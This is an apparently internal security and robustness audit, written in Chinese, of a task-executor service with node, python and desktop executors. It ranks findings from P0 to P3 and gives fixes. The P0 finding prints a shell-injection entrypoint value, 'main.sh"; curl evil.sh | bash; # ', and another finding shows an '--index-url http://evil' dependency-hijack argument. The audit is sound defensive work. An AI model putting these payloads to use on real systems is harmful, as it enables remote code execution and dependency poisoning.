# R4-C 执行器运行时健壮性审计（2026-09-02）

> 审计范围：`apps/executor-node`、`apps/executor-python`、`apps/executor-desktop`（`resources/executor-node/index.js` 为生成物，不在修复建议范围）。
> 审计方式：只读。已运行 executor-node 定向 jest（79/79 通过，基线未回归）。
> 基线 commit：`ef635ef`（develop）。已核实 eadedca（包下载 Bearer token + 跨主机重定向剥离）与 6062bee（shell entrypoint 白名单）两个已修项现状，见文末「已核实无问题的检查项」。
> 严重级别：P0=任意命令执行/凭证泄露/执行槽永久泄漏；P1=资源泄漏或状态错乱；P2=健壮性缺口；P3=建议。

---

## Findings

### [P0] executor-python shell runtime entrypoint 经 `bash -c` 字符串拼接，任意命令执行（node 侧已修同类问题，python 侧漏修）

**证据**：`apps/executor-python/routers/execute.py:275`

```python
cmd = ['bash', '-c', f'cd "{work_dir}" && exec "{entrypoint}"']
```

**触发场景推理**：`entrypoint` 完全来自任务参数（admin 侧 task.entrypoint，无任何校验）。提交 `entrypoint = 'main.sh"; curl evil.sh | bash; # '` 即可在 `cd` 之后注入任意命令——`"` 直接闭合了拼接的引号对。这是与 6062bee 在 executor-node 侧修掉的同源问题：node 侧 `routes/execute.ts:342-346` 已改为 `bash <file>`（数组参数、无 `-c`，不做 shell 展开），deploy.ts 的 `sh -c` 分支也加了 `SAFE` 字符白名单（deploy.ts:139-155），唯独 executor-python 的 execute.py 没有任何等价防护。执行器以自身进程身份运行，注入的命令拥有 executor 全部权限（读 EXECUTOR_SHARED_TOKEN 所在环境变量之外的文件系统、横向访问 admin-api）。

**confidence**: verified（代码路径静态可证；node 侧同源问题已被定性为 P0 并修复，python 侧同模型）

**建议修复**：与 node 侧对齐——python/shell runtime 均改为 `[cmd, entrypoint]` 数组直传（`bash entrypoint` 以脚本方式执行，cwd 已由 `create_subprocess_exec(cwd=work_dir)` 保证，无需 `cd`）；若必须保留 `-c`，加与 deploy.ts:139 相同的 `^[A-Za-z0-9._/ :\\-]+$` 白名单。同时给 glue shell 分支保留绝对路径直传。

**测试影响**：executor-python `tests/test_execute.py` 需新增：entrypoint 含 `"; "`、`$(...)`、反引号的任务应失败且不产生副作用；正常脚本路径照常执行。

---

### [P1] executor-node callback 批量无 100 上限分片 + 失败文件无重试上限/无清理 → 毒文件每秒重试、执行结果永久丢失

**证据**：
- `apps/executor-node/src/callback.ts:119-122`（整队列出队成一批）、`callback.ts:100-114`（5 次退避后 `persistFailedCallbacks` 写单个文件）、`callback.ts:74-98`（`retryFailedCallbacks` 每秒重读全部文件原样重发，无上限、无清理条件）
- admin-api 侧硬性拒绝：`apps/admin-api/src/modules/task/execution-callback.controller.ts:65-67` `callbacks.length > 100 → BadRequestException("Callback batch size cannot exceed 100")`；DTO 校验失败（`errorMessage` MaxLength 4096、token 校验 401）同样整体 400/401。

**触发场景推理**：admin-api 不可达期间 callback 队列持续累积（每个完成的任务入队一次，`processCallbacksWithBackoff` 一轮最长约 5×10s+31s），admin 恢复前若队列超过 100 条（admin 宕机数分钟即可能发生）， drain 出的**单批**超过 100 → 永远 400 → 落盘为单个文件 → `retryFailedCallbacks` 每秒原样重发 → 永远 400 → 文件永不删除。后果：(1) 这批执行的 success/failed 状态永远到不了 admin（只能靠 admin 侧 zombie sweeper 兜底标记失败，真实成功任务被标为失败）；(2) 毒文件每秒一次网络重试无限期空转；(3) 401（executor 被删除/token 轮换后地址校验失败）场景同理永久重试。

**confidence**: verified（两端代码均可静态确证；批量无分片、文件无清理路径均存在）

**建议修复**：发送与落盘前按 100 条分片；`retryFailedCallbacks` 对 4xx（非 408/429）直接放弃并删除/改名 `.dead` 文件；给文件重试加最大次数或指数退避时间戳。

**测试影响**：`callback.spec.ts` 新增：101 条批量应分片发送；模拟 400 后文件应进入终态而非每秒重发。

---

### [P1] 任务 workdir / .git_cache / .node_modules / .venvs / callbacks / .pkg-updates 全部无回收 → 磁盘慢性耗尽

**证据**：
- executor-node：`routes/execute.ts` 全文无任何对 `workDir`（`config.workDir/<executionId>`，含克隆的 repo + npm 产物）的 `rmSync`；`.git_cache`（execute.ts:75）只增不减；`.node_modules/<taskId>`（execute.ts:265）只增不减；`callbacks/` 目录（callback.ts:24-28）文件仅在重试成功时删除（结合上一条存在永不删除路径）；`.pkg-updates`（update-package.ts:111）成功下载的包文件永久留存（仅失败分支 unlink，update-package.ts:146）。
- executor-python：`routers/execute.py` work_dir、`.git_cache`、`.venvs/<taskId>` 同样无清理；grep 全仓仅有 file-logger 的 7 天日志目录清理（file-logger.ts:70）与 deploy.ts 的 release 目录管理。

**触发场景推理**：三个路径全部命中：成功（workdir 留存）、失败（git 半克隆/npm 半安装产物留存）、超时（workdir 留存）。每个执行至少留下克隆仓库 + 依赖目录（node）或 venv（python，venv 以 task_id 为键跨执行复用、永不重建回收）。长时间运行的执行器磁盘使用单调增长，最终触发 `/health` 的 `diskUsage >= 90 → degraded`，但**没有任何自动清理动作**，之后所有任务因磁盘满失败（npm/uv 安装失败、git clone 失败），需要人工登录清理。

**confidence**: verified（全文检索无清理逻辑；成功/失败/超时三路径均确认）

**建议修复**：任务终态（callback 成功落库后）删除 `workDir/<executionId>`；`.git_cache` 与 `.node_modules`/`.venvs` 增加 LRU/TTL 清理（可挂进现有 `startLogCleanup` 定时器）；`callbacks/.dead` 定期清理；`.pkg-updates` 下载确认后删除或改用临时文件。

**测试影响**：新增清理单元测试：成功/失败/超时后 workdir 不存在；`.git_cache` TTL 清理保留最近使用的条目。

---

### [P1] 任务 stdout/stderr 无上限累积进内存（`logs += output`），大输出任务 OOM 整个执行器；appendFileSync 逐 chunk 同步写阻塞事件循环

**证据**：`apps/executor-node/src/routes/execute.ts:482-491`

```ts
proc.stdout.on('data', (d: Buffer) => {
  const output = d.toString();
  logs += output;                      // 无上限
  if (executionId) appendLog(executionId, output);  // 同步 IO
});
proc.stderr.on('data', ...)            // 同样累积
```

executor-python 同构：`routers/execute.py:297-305` `log_chunks.append(line)` 无上限。回调侧虽有 `truncateCallbackLogs`（execute.ts:404-412，10k 截断）与 python 侧 10k 截断，但**截断发生在累积之后**——内存峰值已形成。

**触发场景推理**：一个死循环 `while(true) console.log(...)` 的任务（或构建类任务输出几十万行），数分钟即可累积数百 MB～GB 级字符串；执行器常驻进程 OOM 被杀 → 该机上**所有**并发任务同时失败（孤儿进程问题见下条 P2），执行槽由 admin 重启检测兜底释放。次要影响：每个 stdout chunk 触发一次 `appendFileSync`，高吞吐输出时事件循环被同步 IO 反复卡住，心跳（30s 周期）与 /health 延迟明显。

**confidence**: verified（代码路径确证；OOM 阈值取决于机器内存，触发机制确定）

**建议修复**：累积上限（如 1MB，环形保留头尾各半，直接以最终回调格式累积）；或只累计字节数、超限后丢弃并置 truncated 标记（磁盘日志已有完整输出供 LOG-01 backfill）。`appendFileSync` 改为带内部缓冲的异步写（write stream）。

**测试影响**：`execute.spec.ts` 新增：超阈值输出任务完成后 callback logs 长度 ≤ 10k 且含 truncation marker；执行器进程 RSS 不随输出线性增长（可用 mock stream 断言累积上限）。

---

### [P1] executor-node requirements 安装后不可解析（`npm install --prefix` 与 Node 模块解析路径断链），声明依赖的任务必然 MODULE_NOT_FOUND

**证据**：`apps/executor-node/src/routes/execute.ts:264-303`——依赖安装到 `config.workDir/.node_modules/<taskId>/node_modules`（npm `--prefix` 语义），任务以 `node <entrypoint>` 且 `cwd=config.workDir/<executionId>` 启动（execute.ts:331-333, 477）。子进程 env 为白名单（execute.ts:306-316），`NODE_PATH` 仅透传执行器自身环境值，从未指向 `.node_modules/<taskId>/node_modules`；Node 解析链 `<execId>/node_modules → <base>/node_modules → ...` 不会命中点前缀目录 `.node_modules`。

**触发场景推理**：本机实测（见下方验证命令输出）：在 `.node_modules/taskA` 下 `npm install --prefix . left-pad` 后，于 `base/exec-1/index.js` 中 `require('left-pad')` → `MODULE_NOT_FOUND`；手工设置 `NODE_PATH=.../taskA/node_modules` 后 → `RESOLVED OK`。即：任何声明 `requirements` 的 node 任务在安装成功后仍于 require 时失败，且失败会被归类为 SCRIPT_ERROR 重试白白消耗执行槽。

**验证方法**（已执行）：
```bash
mkdir -p base/.node_modules/taskA base/exec-1
(cd base/.node_modules/taskA && npm install --prefix . left-pad)
node -e "require('left-pad')"   # cwd=base/exec-1 → MODULE_NOT_FOUND
NODE_PATH=base/.node_modules/taskA/node_modules node -e "..."  # OK
```

**confidence**: verified（本机复现 + 代码路径确证）

**建议修复**：任务 env 注入 `NODE_PATH = <nodeModulesDir>/node_modules`（追加到白名单透传值之后）；或在 workdir 创建 `node_modules` 符号链接指向共享目录（注意并发执行同一 task 时的链接共享语义）。

**测试影响**：`execute.spec.ts` 新增：声明 requirements 的任务，断言 spawn 收到的 env 含指向 `.node_modules/<taskId>/node_modules` 的 NODE_PATH。

---

### [P1] deploy.ts 向部署应用及其安装子进程泄露执行器完整环境变量（含 EXECUTOR_SHARED_TOKEN / EXECUTOR_SECRET），绕过 SEC-01 白名单

**证据**：`apps/executor-node/src/routes/deploy.ts:75` 与 `deploy.ts:117`

```ts
const env = { ...process.env, ...envVars };   // installDeps 与 startApp 两处
```

对比任务执行路径已按 SEC-01 白名单过滤（execute.ts:305-316，注释明确 "never expose executor secrets"）。

**触发场景推理**：deploy 的应用代码来自 gitRepo/packageUrl（用户可控）。应用进程及其 npm/pip 子进程拿到完整执行器环境：共享 token 可直接调用 admin-api `/executors/heartbeat`（伪造负载）、`/executions/callback`（**伪造任意执行结果/释放槽位**，controller 仅校验 Bearer token 与 executorAddress 匹配）、以及执行器的 `/api/execute`（以其身份派发新任务）。部署类应用与一次性任务的信任边界本应相同，当前不一致。

**confidence**: verified（代码确证；token→admin-api 各 @Public 端点权限已对照 executor.controller.ts 确认）

**建议修复**：deploy 路径同样使用 ENV_WHITELIST（可提取为公共模块），仅额外注入应用自身的 `envVars` 与 `.env` 文件。

**测试影响**：`deploy.spec.ts` 新增：startApp spawn 收到的 env 不含 EXECUTOR_SHARED_TOKEN/EXECUTOR_SECRET。

---

### [P2] 优雅关闭/崩溃后 detached 任务子进程无人回收（孤儿逃逸）；desktop 8s SIGKILL 先于执行器 30s 宽限加剧该问题

**证据**：
- `apps/executor-node/src/routes/execute.ts:477` `spawn(cmd, args, { detached: process.platform !== 'win32' })`——任务进程为会话组长，执行器退出**不会**连带终止。
- `apps/executor-node/src/main.ts:117-138`：`taskWorkerManager.stopAll()` 只对**排队**任务发 failed callback（task-worker.ts:90-104），运行中任务仅等待 30s；宽限耗尽后 `process.exit(0)`，运行中子进程成为孤儿，callback 线程已停，结果永不上报。
- 桌面端 `apps/executor-desktop/src/main/executor-process.ts:117-126`：stop() 8 秒即 SIGKILL，早于执行器自身的 30s 宽限 → 执行器被强杀时正在运行的任务直接孤儿化，`notifyOffline` 也未发出。
- 崩溃路径（OOM/SIGKILL/未捕获异常）无任何恢复措施：启动时没有按 pid 记录清扫遗留任务进程的逻辑（无 pid 落盘、无 startup sweep）。

**触发场景推理**：管理员在桌面端点击停止（或升级部署）时恰有长任务在跑 → 8 秒后执行器被 SIGKILL，任务进程组（detached）继续在宿主机运行且永不退出（如守护型脚本）；其 workdir 因上一条 P1 也不清理。执行器崩溃重启后，admin 侧重启检测（R-P0-008/009）会把执行标记失败、槽位释放，但宿主机上的孤儿进程仍占 CPU/内存，且无法通过任何接口终止。

**confidence**: verified（三条路径代码确证；孤儿语义为 POSIX detached 进程标准行为）

**建议修复**：(1) `runProcess` 启动时把 `proc.pid` 写入 `workDir/meta/<executionId>.pid`（writeExecMeta 已有机制）；执行器启动时扫描 workDir 内遗留 pid 文件并 kill 进程组后再清理；(2) gracefulShutdown 宽限耗尽时对运行中任务的进程组发 SIGKILL 再退出；(3) desktop stop() 宽限提升到 ≥ 执行器 30s（或改为轮询 /health/live 判定退出）。

**测试影响**：`task-worker.spec`/新 spec：模拟宽限耗尽路径断言子进程组被 kill；启动 sweep 单测（伪造 pid 文件 + mock process.kill）。

---

### [P2] update-package 下载未携带 Bearer token（eadedca 只修了 deploy.ts 的 downloadPackage）+ socket 空闲超时可被慢滴绕过 → updateInProgress 永久卡死

**证据**：`apps/executor-node/src/routes/update-package.ts:29-62`——`downloadFile` 直接 `proto.get(url)`，**无 Authorization 头**（对照 deploy.ts:251-295 的 `downloadPackage` 已在 eadedca 加 token + 跨主机剥离，两份实现重复且行为漂移）。`req.setTimeout(120_000)` 是 socket 空闲超时：服务端每秒滴 1 字节即永不触发。`res.pipe(file)` 无大小上限。`tmpFile` 由未校验的 `body.packageId` 拼接（update-package.ts:115），含 `/`/`..` 时可写出 `.pkg-updates` 之外。

**触发场景推理**：(1) admin-api `/uploads` 已强制鉴权（eadedca 提交说明），executor-package push 的下载地址若指向 admin-api 自身 → update-package 一律 401，**包升级功能整体失效**（与 deploy 包部署行为不一致）；(2) 恶意/异常下载源慢滴 → 下载永不结束 → `updateInProgress` 永久 true → 后续所有包推送 409，执行器永远无法升级（需重启）；(3) 下载无大小上限 + 慢滴 → 磁盘写满。

**confidence**: verified（对照两端代码确证；401 场景依赖 admin-api upload-auth 现状，已在 eadedca 说明中确认该鉴权存在）

**建议修复**：update-package 复用 deploy.ts 的 `downloadPackage`（或提取到公共模块）：携带 `Authorization: Bearer config.token`、跨主机重定向剥离、加整体下载超时（deadline）与 maxBytes；`packageId` 用 `isSafePathSegment`（deploy.ts:297）校验。

**测试影响**：`update-package.spec.ts` 新增：请求带 Bearer 头、跨主机重定向剥离、慢滴场景 deadline 超时、恶意 packageId 400。

---

### [P2] deploy.ts 主流程仍在请求路径上使用 spawnSync（npm/pip/git/unzip 最长 5 分钟），事件循环冻结 → 心跳停摆、admin 侧可能标记 OFFLINE

**证据**：`apps/executor-node/src/routes/deploy.ts:87,97,102,406,514,528,539,546` 共 8 处 `spawnSync`（npm install 300s / pip install 300s / git clone 120s / unzip 60s / venv 60s），均在 `setImmediate(async ...)` 内同步执行。同文件 221-248 行已定义了异步 `runCommand` 并注释 "spawnSync still froze the whole process (heartbeats, /health, all APIs)"，但**该 helper 在文件内零调用（死代码）**，修复只完成了一半。

**触发场景推理**：大依赖项目部署期间（数分钟），执行器心跳停发 → admin 侧心跳超时（heartbeat interval × multiplier）把执行器标 OFFLINE → 期间的任务派发全部失败/被重排；`/health` 与 `/api/execute` 同步冻结。execute.ts 同类问题已在先前轮次改为 async spawn，deploy.ts 遗漏。

**confidence**: verified（8 处 spawnSync + 零调用的 runCommand 均已确认）

**建议修复**：将 installDeps/git/unzip 分支改用已有 `runCommand`（补 cwd/env/timeout 等价参数），删除死代码或启用之。

**测试影响**：`deploy.spec.ts` 现有 spawnSync mock 需改为 promise mock；新增"部署期间 /health 可响应"用例。

---

### [P2] `/api/logs/:executionId` 忽略分页 limit、`hasMore` 恒为 false、整文件一次性读入并全量返回

**证据**：`apps/executor-node/src/routes/logs.ts:75-86`

```ts
const fromLine = Math.max(0, parseInt(...) || 0);
const raw = fs.readFileSync(logFile, 'utf-8');
const sliced = allLines.slice(fromLine);          // 到文件尾，无 limit
res.json({ lines: sliced, totalLines: total, hasMore: false });
```

对照：admin-api 的 LOG-01 回填按 `limit: 2000` 分页拉取并依赖 `hasMore`（task.service.ts:916-927 `PAGE_LIMIT=2000`，按 `hasMore`/`totalLines` 推进）；executor-python 的同名接口正确实现 limit/hasMore（routers/logs.py:26-43）。

**触发场景推理**：被截断回调触发回填时，admin 期望每页 2000 行，node 执行器却一次返回 fromLine 之后的**全部**行（大日志=数十 MB JSON）；admin 侧虽有 64MB `maxContentLength` 兜底（超限直接抛错、回填失败），但正常大日志会同时打爆两端内存与网络。`hasMore: false` 使分页循环语义错误（当前回填恰好还能靠 totalLines 判停，属侥幸兼容）。

**confidence**: verified（两端代码对照确证）

**建议修复**：对齐 python 实现：`limit = clamp(query.limit ?? 500, 1, 2000)`，`hasMore = fromLine + sliced.length < total`；改用流式按行读取避免整文件 readFileSync。

**测试影响**：`logs.spec.ts` 新增 limit/hasMore 分页用例（与 python 端行为对齐）。

---

### [P2] 首次 git clone 缓存无并发串行化：同 repo 并发首执行互相踩踏（npm 安装已有 queueTaskInstall，git 没有）

**证据**：`apps/executor-node/src/routes/execute.ts:74-94`——`gitCheckoutTo` 以 `fs.existsSync(cacheDir/HEAD)` 判缓存， miss 时两个并发执行同时 `mkdirSync` + `git clone --bare` 到同一 `cacheDir`；竞败方 clone 报错 → `git clone failed` → 该次执行 500。npm 安装侧有 `queueTaskInstall` 按 taskId 串行（execute.ts:58-71），git 缓存无对应机制。executor-python 同构（routers/execute.py:38-54），且 python 侧 `_repo_dir_name` **没有** node 侧的 URL hash 盐（execute.ts:18-21 注释明确「sanitization alone maps distinct repos onto the same cache directory (cross-repo contamination)」）——`a/b.git` 与 `a_b.git` 在 python 执行器上共享缓存目录，存在**跨仓库污染**（checkout 到错误 repo 的文件）。

**触发场景推理**：广播模式（dispatchBroadcast 同时发给多台不相关；同机并发靠 cron/手动触发也常见）或两个任务首次引用同一 repo → 其中一次执行失败重试；python 侧更糟：不同 repo 可能 checkout 出错误代码并静默执行。

**confidence**: verified（node 并发竞态静态确证；python 跨 repo 目录碰撞由 execute.ts:18-21 官方注释反证）

**建议修复**：按 `repoDirName` 加 per-repo promise 队列（复用 queueTaskInstall 模式）；python 侧 `_repo_dir_name` 补 URL hash 盐。

**测试影响**：新增并发 checkout 单测（同 repo 两次并发只触发一次 clone）；python 侧目录名碰撞回归用例。

---

### [P2] executor-python 回调单次发送无重试/落盘、无 100 上限意识；errorMessage 可超 DTO 4096 限制导致整批 400

**证据**：`apps/executor-python/routers/execute.py:124-138`——单次 `client.post(.../executions/callback, json=[payload])`，失败仅 `logger.warning`，无重试、无退避、无落盘（node 侧为 5 次退避 + 磁盘持久化，callback.ts:100-114）。`errorMessage` 取 `str(exc)`，其中 `ensure_venv` 失败时为 `uv pip install failed: {out.decode()}`——out 是 uv 的**全部** stdout+stderr（execute.py:147-173），轻松超过 admin DTO `errorMessage MaxLength(4096)`（execution-callback.dto.ts）→ ParseArrayPipe 整批 422/400 → 结果丢失（叠加本条无重试，只能等 admin zombie sweeper 标失败）。

**触发场景推理**：依赖安装报错（常见！磁盘满/私仓超时/包名冲突）→ 完整 uv 日志进 errorMessage → 回调被 admin 拒绝 → 执行状态卡 RUNNING 直到 task timeout+buffer 后被 sweeper 标失败，失败原因丢失（用户看到的是超时而非真实安装错误）。

**confidence**: verified（两端代码确证；uv 输出无截断路径确认）

**建议修复**：errorMessage 截断至 ≤4000 字符；回调复用 node 侧语义（重试 + 落盘或至少 3 次退避）；日志与错误信息分开（安装日志应进 logs 字段，已被 10k 截断保护）。

**测试影响**：`test_execute.py` 新增：venv 失败时 payload errorMessage 长度 ≤ 4000；httpx 抛错时的重试断言。

---

### [P2] executor-python `asyncio.create_task` 未保存引用（任务可能被 GC 中断）+ `ensure_venv` 超时不杀 uv 子进程 + 半建 venv 被当作有效复用

**证据**：
- `routers/execute.py:94` `asyncio.create_task(_run_and_callback(req))` 返回值未保存——CPython 文档明确警告 "Save a reference to the result of create_task, to avoid a task disappearing mid-execution"（事件循环仅持弱引用）。
- `routers/execute.py:147-173` `asyncio.wait_for(proc.communicate(), timeout=60/300)` 超时抛 TimeoutError 时**未 kill uv 进程**：uv 成为孤儿继续安装；若超时发生在 `uv venv` 阶段，半成品 venv 目录已存在 → 下次 `if not venv_dir.exists()` 判真 → 坏 venv 被复用，任务持续失败且难以自愈。

**触发场景推理**：GC 中断为低概率高危（任务静默消失、无回调、无日志）；venv 超时（私仓慢）后该 task 的 venv 永久损坏，需要人工删 `.venvs/<taskId>`。

**confidence**: verified（create_task 引用缺失静态确证；wait_for 不杀进程为 asyncio 标准语义）

**建议修复**：模块级 `set` 持有 task 引用并在 done callback 中移除；wait_for 超时分支补 `proc.kill(); await proc.wait()`，失败后删除半成品 venv 目录再抛错。

**测试影响**：`test_execute.py` 新增：venv 创建超时后目录被清理、uv 进程被终止（mock 断言）。

---

### [P2] 未配置 token 时执行器对全网开放 /api/execute（dev-mode 放行），启动无任何警告

**证据**：`apps/executor-node/src/middleware/auth.ts:101-105`（`validTokens` 为空 → `next()` 放行）；executor-python `auth.py:87-89` 同构。两执行器均绑定 `0.0.0.0`（main.ts:145 / main.py:139），`EXECUTOR_SHARED_TOKEN`/`EXECUTOR_SECRET` 均未设置时，任何能路由到该端口的主机都可提交 `/api/execute` 在执行器上执行任意代码（含 gitRepo 注入面）。当前代码无启动警告、/health 仅返回 `tokenValid: false`。

**触发场景推理**：漏配 token 的部署（新机器初始化遗漏、docker-compose 变量丢失）= 无鉴权 RCE 端点。admin-api 侧已有共享 token 的安装命令下发，正常流程会配置，但缺省失败模式应为「拒绝服务」而非「开放执行」。

**confidence**: verified（代码确证；是否实际部署存在属运维问题）

**建议修复**：至少在启动与 /health 中对 `tokenValid=false` 打 WARN/降级状态；提供 `REQUIRE_TOKEN=true` 类开关在未配置 token 时直接 503 拒绝 /api/*。

**测试影响**：auth.spec 新增：无 token 且 REQUIRE_TOKEN 时 401/503 用例。

---

### [P3] uv/pip requirements 参数注入（executor-python 未做包名校验，node 侧有 npmNameRe）

**证据**：`apps/executor-python/routers/execute.py:158-171`：requirements 原样追加进 `uv pip install` 参数，`-` 开头项被解析为选项（如 `--index-url http://evil`、`--extra-index-url` 劫持依赖源）。node 侧已有 `npmNameRe` 白名单（execute.ts:272-278）。

**confidence**: verified（代码确证；uv 选项表支持 --index-url）

**建议修复**：校验 requirement 匹配 PEP 508 name/spec 形态或至少拒绝 `-` 开头项。

**测试影响**：test_execute.py 新增 requirements 含 `--index-url` 被拒用例。

---

### [P3] /api/execute 的 shell entrypoint 可用相对路径穿越执行宿主机任意可执行脚本；git checkout ref 未拒绝 `-` 开头值；task.timeout 未做下限校验

**证据**：
- `execute.ts:342-346`：shell runtime 直接 `bash <entrypoint>`，entrypoint 未做 basename/穿越校验（`logs.ts` 的日志接口反而有 basename guard）——可指向 workdir 之外的脚本（如其他执行残留物）。
- `execute.ts:88-93`：`git checkout <ref> -- .` 的 ref（`gitCommit || gitBranch`）未拒绝 `-` 前缀；对照 deploy.ts:436-452 已做 `/^-/`、分支字符集与 commit hex 校验——两处不同步。数组参数下无法注入 shell，但 `-b`/`--orphan` 等 option 注入可造成非预期 checkout 行为。
- `execute.ts:225`：`timeout = task.timeout || config.taskTimeoutSeconds`，负值/0.5/1e9 均未校验：负值 → `setTimeout(负)` 立即触发 → 任务秒杀；超大值 → 定时器近似永久。admin DTO 层是否有界未在本轮核实范围。

**confidence**: verified（代码确证）

**建议修复**：entrypoint 限制为 basename 且必须存在于 workdir；ref 复用 deploy.ts 的校验；timeout 校验 `1 <= timeout <= 86400`。

**测试影响**：execute.spec.ts 新增三类负向用例。

---

### [P3] executor-python 事件循环阻塞点与 node runtime requirements 静默忽略

**证据**：`scheduler.py:68` `psutil.cpu_percent(interval=1)` 在 async 函数内同步睡眠 1 秒（每次心跳阻塞事件循环 1s，期间所有 /api/execute、回调都停摆）；`routers/execute.py:266-269` runtime=node 时 requirements 不安装也不提示（node 侧会安装）。

**confidence**: verified

**建议修复**：`cpu_percent(interval=None)` 用两次采样差值（对照 node scheduler.ts 的 measureCpuUsage 实现）；node+requirements 组合返回明确错误或安装。

**测试影响**：心跳耗时断言；node+requirements 行为用例。

---

### [P3] executor-desktop：executor-node 崩溃后不自动拉起；stop 宽限 8s（并入 P2 孤儿条目的修复建议）

**证据**：`apps/executor-desktop/src/main/executor-process.ts:93-102`——exit 后仅置 offline，无重启/退避逻辑；崩溃后需人工从托盘重启。

**confidence**: verified

**建议修复**：提供可选自动重启（指数退避 + 最大次数），或在托盘/通知中显式提示。

**测试影响**：人工验证路径；单测可 mock exit 事件断言重启计数。

---

## 已核实无问题的检查项

1. **git 命令注入回归**（排查项 6）：executor-node `execute.ts:78-93`（clone/fetch/checkout）、`deploy.ts:539-548`（clone/checkout）全部数组参数、无 `shell:true`；`ext::`/`file://` 等特殊 URL 被 `^(https?://|git@|ssh://)` 白名单拦截（execute.ts:196-199、deploy.ts:437）；`--upload-pack` 类 option 注入被 deploy.ts:437 的 `/^-/` 拦截；`git@`/ssh URL 本体不含命令执行向量。execute.ts 的 ref 仅有 `-` 前缀小缺口（P3 已列）。凭证：URL 内嵌凭证不落日志（redactUrl execute.ts:25-27 / deploy.ts:217-219）；执行器不持有 git 凭证。
2. **6062bee（shell entrypoint 白名单）无回归**：deploy.ts:139-155 白名单在位；execute.ts shell 分支采用 `bash <file>` 无 `-c` 结构性免疫；execute.spec.ts 通过。executor-python 的同类 P0 为**漏修**而非回归。
3. **eadedca（包下载 token + 重定向剥离）无回归**：deploy.ts `downloadPackage` 携带 Bearer、`nextUrl.hostname` 同主机判断、相对 location 经 `new URL(location, url)` 规范解析、无 token 不发头；deploy.spec.ts 79/79 全绿（含 2 个新增用例）。缺口仅在 update-package.ts 的**另一份未同步实现**（P2 已列）。
4. **任务超时强制**：node `runProcess` setTimeout 直杀进程组（`process.kill(-pid, SIGKILL)`，execute.ts:493-514），`settled` 防重入；python `asyncio.wait_for(shield(stream_task))` + `os.killpg(os.getpgid(pid))`（execute.py:295,309-341），`preexec_fn=os.setsid` 保证进程组成立。定时器均非轮询。Windows 仅杀父进程为平台限制（node execute.ts:499-503 有分支注释）。
5. **执行槽并发上限**：node `Atomics.add` 先占位后校验（execute.ts:116-123），所有同步拒绝路径 `sendError` 均释放，handoff 后由 worker `finally` 唯一释放（task-worker.ts:67-71 + execute.ts:126-137），无双重释放路径；外层 catch 对 handedOff 情形不重复释放（execute.ts:373-385）。python 侧 check-then-increment 之间无 await（asyncio 单线程内原子）。admin 侧派发为乐观锁原子自增（executor.service.ts:526-547）。
6. **HTTP 客户端超时覆盖**：admin-client 统一 10s timeout（admin-client.ts:105）；health 探测 3s（health.ts:33）；token fetch 10s（auth.ts:49）；python httpx 心跳 5s/回调 10s/注册 10s；desktop health poll 3s（executor-process.ts:158）与 HeartbeatMonitor 3s（heartbeat.ts:41）。未发现无 timeout 的挂起 socket 会长期占用执行槽（update-package 慢滴除外，已列 P2）。
7. **子进程启动失败（ENOENT）**：`spawn` 'error' 事件均 resolve/reject 且清理定时器（execute.ts:47-50, 532-537；deploy.ts:209-213 上报 failed）；python `create_subprocess_exec` 异常被 `run_task` 兜底 except 捕获并正常回调 failed。
8. **callback 与 admin 契约（正常路径）**：字段 executionId/status/exitCode/logs/errorMessage/durationMs/executorAddress 与 `CallbackItemDto` 对齐；logs 10k 截断（含 `[logs truncated...]` marker，被 admin LOG-01 识别触发回填，task.service.ts:41）；exitCode/durationMs 类型为 int 或缺省；重复回调幂等（admin `status IN (PENDING,RUNNING)` 条件更新，task.service.ts:1035-1048）。
9. **心跳/注册契约**：字段 address/cpuUsage/memUsage/runningTaskCount/restartedAt/startupId 与 admin `heartbeat()` 期望一致；node 发 `maxConcurrent`、python 发 `maxConcurrentTasks`，admin 两者兼容（executor.service.ts:222）；动态 token 双端实现一致（30 分钟刷新、5 分钟提前量、静态 token 回退、时序安全比较）。
10. **executor 重启后的状态收敛**：admin 侧以 startupId/restartedAt 检测重启 → 运行中执行批量标 FAILED（EXECUTOR_RESTART）+ 槽位释放 + 可选重试（executor.service.ts:156-200, 248-256）；心跳丢失 → OFFLINE cron（executor.service.ts:769+）→ zombie sweeper 对 OFFLINE 执行器上超时 RUNNING 执行标失败（executor.service.ts:687-743）。executor 崩溃不造成执行槽永久泄漏。
11. **日志上报量控制**：回调 logs 10k 截断（node/python 均为头尾保留）；磁盘日志 7 天保留 + 按日期目录清理（file-logger.ts:56-79）；admin 回填 64MB/页 2000 行/200 页三重上限。
12. **workDir 路径安全**：executionId 穿越校验 + symlink 双重防护（execute.ts:147-188）；python 对应实现一致（execute.py:181-192）；logs 接口 basename guard（logs.ts:34-38）；python logs 接口双重校验（logs.py:29-35）。
13. **包更新原子性（当前实现范围）**：update-package 实际只做 download→checksum→上报，不自动替换/重启（update-package.ts:139-140 明示人工/流水线应用），故不存在「半更新」状态；checksum 缺失直接 400（81-84），不匹配走失败清理路径并上报 failed（142-153）；`updateInProgress` 检查-置位为同步代码无竞态（98-103）。deploy 的 releases/current 符号链接切换具备 switchCurrentRelease 原子重命名 + 失败回滚 restoreCurrentRelease（deploy.ts:378-401, 578-585）。
14. **zip 解压路径安全**：`assertSafeZipEntries` 拒绝绝对路径与 `..` 条目（deploy.ts:403-418）；appId/deploymentId/releaseKey 均有 `isSafePathSegment` 约束（deploy.ts:297-359）。
15. **配置热更新**：node/python 均校验下限（≥1/≥5），python 侧 snake/camel 双别名兼容 admin 侧 push（config.py routes 与 executor.controller.ts reloadConfig 对照）；admin 侧 push 前校验执行器 online 并用 rotateToken 一次性凭证。
16. **executor-node jest 基线**：定向全量 79/79 通过（本次审计未改动任何源码）。

---

## 统计

| 级别 | 数量 |
|------|------|
| P0 | 1 |
| P1 | 5 |
| P2 | 8 |
| P3 | 4 |
| 已核实无问题 | 16 项 |
